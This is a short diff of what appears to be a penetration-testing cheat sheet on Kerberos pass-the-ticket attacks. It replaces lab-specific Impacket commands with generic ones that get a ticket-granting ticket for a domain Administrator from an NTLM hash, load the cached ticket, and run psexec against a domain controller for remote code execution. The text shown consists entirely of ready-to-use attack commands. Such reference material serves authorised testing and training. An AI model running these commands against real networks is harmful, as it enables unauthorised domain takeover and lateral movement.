@@ -36,11 +36,11 @@ OR
 
 ## Alternate Method: Impacket getTGT
 
-    python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
+    impacket-getTGT -dc-ip DC_IP -hashes :32196b56ffe6f45e294117b91a83bf38 domain.local/Administrator
 
-    export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
+    export KRB5CCNAME=Administrator.ccache
 
-    python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
+    impacket-psexec domain.local/administrator@DC.domain.local -k -no-pass -dc-ip DC_IP
 
 ## Alternate Method: Rubeus
 
